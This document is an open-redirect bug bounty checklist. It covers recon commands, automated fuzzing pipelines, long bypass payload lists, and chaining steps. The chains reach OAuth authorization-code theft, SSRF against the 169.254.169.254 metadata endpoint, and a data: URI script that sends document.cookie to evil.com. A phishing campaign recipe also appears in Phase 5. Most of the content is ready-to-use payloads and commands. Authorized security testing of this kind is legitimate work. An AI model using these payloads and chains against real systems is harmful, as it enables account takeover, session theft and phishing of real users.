# Open Redirect — Bug Bounty Hunting Checklist

> **Priority Mindset:** Bare open redirects are usually Low/Informational. Always hunt with a chain in mind. The goal is OAuth ATO or SSRF.

---

## Phase 1 — Recon & Discovery

### 1.1 Google Dorks (start here, zero noise)
```
site:target.com inurl:redirect
site:target.com inurl:url=http
site:target.com inurl:next=http
site:target.com inurl:return=http
site:target.com inurl:redir
site:target.com inurl:destination
site:target.com inurl:returnTo
site:target.com inurl:continue=
site:target.com inurl:=https
site:target.com inurl:logout inurl:redirect
site:login.target.com inurl:redirect_uri
site:target.com filetype:js intext:"redirect" OR intext:"window.location"
site:target.com inurl:%3Dhttp
site:target.com inurl:%3D%2F
```

### 1.2 Historical URL Harvesting (CLI Pipeline)
```bash
# Collect URLs from Wayback Machine, Common Crawl, AlienVault
echo "target.com" | gau --o urls.txt
# OR: waybackurls target.com >> urls.txt

# Add live crawl to catch what gau misses
echo "target.com" | katana -o crawled.txt
cat crawled.txt >> urls.txt

# Deduplicate
cat urls.txt | uro | sort -u > urls_clean.txt
```

### 1.3 Parameter Extraction
```bash
# Extract redirect-parameter URLs using gf
cat urls_clean.txt | gf redirect > candidates.txt

# Manual grep fallback if gf patterns aren't installed
grep -iE "(url=|next=|redir=|redirect|dest=|rurl=|return=|continue=|goto=|target=|forward=|callback=)" urls_clean.txt > candidates.txt

# Check for path-based redirects too
grep -iE "(/redirect/|/out/|/go/|/link/)" urls_clean.txt >> candidates.txt
```

### 1.4 Hidden Parameter Discovery
```bash
# Find undiscovered redirect parameters on known endpoints
ffuf -u "https://target.com/login?FUZZ=https://evil.com" \
  -w /path/to/burp-parameter-names.txt \
  -mc 301,302,303,307,308 -fs 0

# ParamSpider for JS-embedded parameters
python3 paramspider.py -d target.com -o params.txt
cat params.txt | gf redirect >> candidates.txt
```

### 1.5 High-Value Endpoint Checklist
Manually browse and note any redirects at:
- [ ] `POST /login` → post-auth redirect (`?next=`, `?return=`, `?returnTo=`)
- [ ] `/logout?redirect=` or `/signout?url=`
- [ ] `/oauth/authorize?redirect_uri=` (highest impact)
- [ ] Password reset flow: `?returnUrl=`, `?redirect=`
- [ ] Email verification click-through links
- [ ] Social share / referral links
- [ ] Checkout / payment completion: `?checkout_url=`, `?continue=`
- [ ] SSO / SAML `?RelayState=` parameter
- [ ] Error pages with `?ref=` or `?from=`
- [ ] "Back to site" buttons after third-party auth

---

## Phase 2 — Automated Scanning

### 2.1 OpenRedireX (primary fuzzer)
```bash
# Install
pip3 install openredirex

# Run against candidate list — FUZZ is replaced with each payload
cat candidates.txt | openredirex -p /path/to/payloads.txt -k FUZZ -c 50 > results_raw.txt

# Pull hits (3xx responses with external Location)
grep -iE "(Location:.*evil\.com|30[1-8])" results_raw.txt > hits.txt
```

### 2.2 Full Automated Pipeline (one-liner)
```bash
echo "target.com" | gau | gf redirect | uro \
  | qsreplace "https://evil.com" \
  | httpx -silent -follow-redirects -match-string "evil.com" \
  -o confirmed.txt
```

### 2.3 Nuclei Templates
```bash
# Official ProjectDiscovery template
nuclei -l candidates.txt -t http/vulnerabilities/generic/open-redirect-generic.yaml -o nuclei_hits.txt

# Run with all fuzzing templates (broader coverage)
nuclei -l candidates.txt -t fuzzing/ -tags redirect -o nuclei_fuzz.txt
```

### 2.4 OpenRedirector (combines ParamSpider + OpenRedireX)
```bash
# https://github.com/0xKayala/OpenRedirector
bash openredirector.sh -d target.com
```

---

## Phase 3 — Manual Testing & Bypass Techniques

### 3.1 Baseline Test
Replace the redirect param value with your collaborator/listener URL:
```
https://target.com/login?next=https://evil.com
```
Look for:
- [ ] HTTP 3xx response with `Location: https://evil.com`
- [ ] Meta-refresh: `<meta http-equiv="refresh" content="0;url=https://evil.com">`
- [ ] JavaScript: `window.location = "https://evil.com"` or `location.href`

### 3.2 Protocol & Slash Bypasses
```
//evil.com
////evil.com
///evil.com
https:///evil.com
/\evil.com
\\/\\/evil.com/
https:evil.com
https;evil.com
```

### 3.3 @ Character Bypasses (browser credential confusion)
```
https://trusted.com@evil.com
https://evil.com@trusted.com
https://trusted.com%40evil.com
https://evil.com\@trusted.com
https://evil.com%5C%40trusted.com        ← Tumblr bypass (%5C = \, %40 = @)
https://trusted.com%2F@evil.com
https://trusted.com%252F@evil.com
```

### 3.4 Domain Spoofing
```
https://trusted.com.evil.com            ← subdomain spoofing
https://trusted.com-evil.com
https://evil.com/?foo=trusted.com       ← domain in query string
https://evil.com/#trusted.com           ← domain in fragment
https://trusted.com#@evil.com           ← fragment @ trick
https://trusted.com.evil.com/trusted.com
```

### 3.5 Encoding Bypasses
```
https%3A%2F%2Fevil.com                  ← URL encoded
https%3A%2F%2Fevil%2Ecom               ← encoded dot
%2F%2Fevil.com                          ← encoded slashes
//evil%E3%80%82com                      ← Unicode ideographic full stop (。)
//evil%00.com                           ← null byte truncation
//evil%2Ecom
%252F%252Fevil.com                      ← double-encoded
```

### 3.6 CRLF & Whitespace Injections
```
java%0d%0ascript%0d%0a:alert(1)        ← CRLF in javascript:
jav%0Aascript:alert(1)                  ← newline in protocol
jav%09ascript:alert(1)                  ← tab in protocol
jav%0Dascript:alert(1)                  ← carriage return
Javascript:alert(1)                     ← case variation
JAVASCRIPT:alert(1)
```

### 3.7 JavaScript & Data URI Escalation
Use these when the app passes redirect value to a DOM sink (highest severity):
```
javascript:alert(document.domain)
javascript:window.location='https://evil.com'
data:text/html,<script>window.location='https://evil.com'</script>
data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb249J2h0dHBzOi8vZXZpbC5jb20nPC9zY3JpcHQ+
```

### 3.8 Parameter Pollution
```
?next=trusted.com&next=evil.com         ← last value wins (depends on server)
?next=evil.com&next=trusted.com         ← first value wins
?url=trusted.com;url=evil.com
```

### 3.9 Path-Based Tricks
```
https://target.com/redirect/https://evil.com
https://target.com/redirect//evil.com
https://target.com/go?url=//evil.com
https://target.com/../evil.com
```

---

## Phase 4 — DOM-Based Open Redirect

### 4.1 Identify DOM Sinks in JS
Search the target's JavaScript files for dangerous assignments:
```bash
# Find JS files
echo "target.com" | gau | grep "\.js$" | sort -u > jsfiles.txt

# Search for redirect sinks
cat jsfiles.txt | while read url; do
  curl -sk "$url" | grep -iE "(location\.href|location\.assign|location\.replace|window\.open|location\s*=)" \
  && echo "SINK FOUND: $url"
done
```

Key sinks to find:
- [ ] `location.href = `
- [ ] `location.assign(`
- [ ] `location.replace(`
- [ ] `window.open(`
- [ ] `location =` (bare assignment)
- [ ] `element.srcdoc =`

Key sources feeding those sinks:
- [ ] `location.hash` (fragment — never sent to server, pure DOM)
- [ ] `location.search` (query string)
- [ ] `document.referrer`
- [ ] `window.name`

### 4.2 DOM Redirect Payload
If `location.hash` feeds `location.href`:
```
https://target.com/page#https://evil.com
https://target.com/page#javascript:alert(1)
```

### 4.3 Automate DOM Sink Discovery
```bash
# Use trufflesecurity/driftwood or grep JS inline
curl -sk https://target.com | grep -oP "location\.(href|assign|replace)\s*=\s*['\"][^'\"]*" 
```

---

## Phase 5 — Chaining for Impact

### 5.1 Open Redirect → OAuth Account Takeover (Critical)
```
Step 1: Confirm open redirect on target.com
         target.com/redirect?url=https://evil.com → redirects ✓

Step 2: Find OAuth flow
         GET /oauth/authorize?response_type=code
           &client_id=CLIENT_ID
           &redirect_uri=https://target.com/callback
           &scope=openid

Step 3: Craft malicious redirect_uri using the open redirect
         redirect_uri=https://target.com/redirect?url=https://evil.com/catch

Step 4: Send victim the crafted auth URL, victim authenticates

Step 5: Authorization code lands in your server logs
         https://evil.com/catch?code=AUTH_CODE

Step 6: Exchange code for access token → full ATO
```

**CLI PoC command:**
```bash
# Confirm code arrives in your listener
python3 -m http.server 8080 &
# Send victim: https://provider.com/oauth/authorize?...&redirect_uri=https://target.com/redirect?url=http://YOUR_IP:8080/catch
```

### 5.2 Open Redirect → SSRF (High)
```
Scenario: App has stock checker / webhook / image fetcher that follows redirects

Payload:
stockApi=https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/

OR for internal admin:
stockApi=https://target.com/product/nextProduct?path=http://192.168.0.1:8080/admin

The SSRF filter sees trusted domain → follows redirect → reaches internal resource
```

```bash
# Test: does the server-side fetch follow the redirect?
curl -sk "https://target.com/api/fetch?url=https://target.com/redirect?url=https://evil.com" \
  | grep -i "evil"
```

### 5.3 Open Redirect → DOM XSS (Medium–High)
```
1. Find open redirect that passes value to DOM sink (location.href)
2. Inject javascript: payload:
   https://target.com/login?next=javascript:alert(document.cookie)
3. If CSP blocks javascript: — try:
   data:text/html,<script>document.location='https://evil.com?c='+document.cookie</script>
```

### 5.4 Open Redirect → Phishing (Low–Medium)
```
Craft convincing URL with legitimate domain in the visible part:
https://target.com/out?url=https://evil-phishing-page.com

Use in email campaigns — victim sees target.com in the URL bar before redirect
```

### 5.5 Iframe SOP Bypass (Edge Case — check if app renders user JS in iframes)
```html
<!-- If the app sandboxes user preview without allow-top-navigation -->
<script>top.window.location = 'https://evil.com'</script>

<!-- Abuse: GitLab Web IDE preview, Notion embeds, user-generated HTML previews -->
```

---

## Phase 6 — Response Validation

Confirm the redirect is actually server-controlled (not just a broken link):
```bash
# Check Location header
curl -sk -I "https://target.com/redirect?url=https://evil.com" | grep -i location

# Follow and confirm final destination
curl -sk -L "https://target.com/redirect?url=https://evil.com" -o /dev/null -w "%{url_effective}\n"

# Check for meta-refresh or JS redirects in body
curl -sk "https://target.com/redirect?url=https://evil.com" \
  | grep -iE "(meta http-equiv|window\.location|location\.href|location\.replace)"
```

Valid redirect indicators:
- [ ] `Location: https://evil.com` in response headers
- [ ] `<meta http-equiv="refresh" content="0;url=https://evil.com">`
- [ ] `window.location = "https://evil.com"` in response body
- [ ] Browser ends up at `evil.com` after visiting the URL

---

## Phase 7 — Reporting

### 7.1 Severity Matrix
| Chain | Severity |
|---|---|
| Standalone (no chain) | Low / Informational |
| + Phishing PoC | Low |
| + CSRF bypass via Referer | Low–Medium |
| + DOM XSS | Medium |
| + SSRF to internal network | High |
| + OAuth ATO (access token/code stolen) | Critical |

### 7.2 PoC Checklist Before Submitting
- [ ] Screenshot or video of browser visiting the crafted URL and landing on evil.com
- [ ] curl output showing `Location:` header pointing to external domain
- [ ] If chained: full step-by-step reproduction with exact URLs
- [ ] Draft impact statement: who can be harmed and how (not just "user redirected")
- [ ] Check program's policy — some exclude standalone open redirect explicitly

### 7.3 Minimal PoC Template
```
Vulnerable URL:
https://target.com/login?next=https://evil.com

Steps to reproduce:
1. Visit the above URL
2. Observe browser is redirected to evil.com

Impact:
An attacker can craft a link that appears to originate from target.com
but redirects the victim to an attacker-controlled domain.
Combined with [OAuth flow at /oauth/authorize], this allows stealing
authorization codes and achieving full account takeover.
```

---

## Parameter Name Master List
```
url, rurl, u, next, link, lnk, go, target, dest, destination,
redir, redirect_uri, redirect_url, redirect, r, view, loginto,
image_url, return, returnTo, return_to, continue, return_path,
path, checkout_url, window, to, out, data, callback, host, port,
feed, reference, site, html, val, validate, domain, navigation,
Open, file, dir, show, forward, page, RelayState, goto, q,
ref, source, src, successURL, failureURL, signout_url, post_logout_redirect_uri
```

---

## Tool Stack Reference
| Tool | Purpose | Install |
|---|---|---|
| `gau` | Historical URL harvesting | `go install github.com/lc/gau/v2/cmd/gau@latest` |
| `waybackurls` | Wayback Machine URLs | `go install github.com/tomnomnom/waybackurls@latest` |
| `katana` | Active crawler | `go install github.com/projectdiscovery/katana/cmd/katana@latest` |
| `gf` | grep patterns for params | `go install github.com/tomnomnom/gf@latest` + 1ndianl33t patterns |
| `uro` | URL deduplication | `pip3 install uro` |
| `qsreplace` | Replace query string values | `go install github.com/tomnomnom/qsreplace@latest` |
| `httpx` | HTTP probe + follow redirects | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` |
| `openredirex` | Redirect fuzzer | `pip3 install openredirex` |
| `nuclei` | Template-based scanning | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| `ffuf` | Parameter fuzzing | `go install github.com/ffuf/ffuf/v2@latest` |
| `ParamSpider` | Hidden param discovery | `git clone https://github.com/devanshbatham/ParamSpider` |

---

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
- 1ndianl33t GF Patterns: https://github.com/1ndianl33t/Gf-Patterns
- PortSwigger DOM Redirect: https://portswigger.net/web-security/dom-based/open-redirection
- PortSwigger Lab – SSRF via Open Redirect: https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection
- PortSwigger Lab – OAuth via Open Redirect: https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect
- OpenRedireX: https://github.com/devanshbatham/OpenRedireX
- Full article references: [[1-Refreces/ARTICLES/ATTACK/OPEN-REDIRECT]]
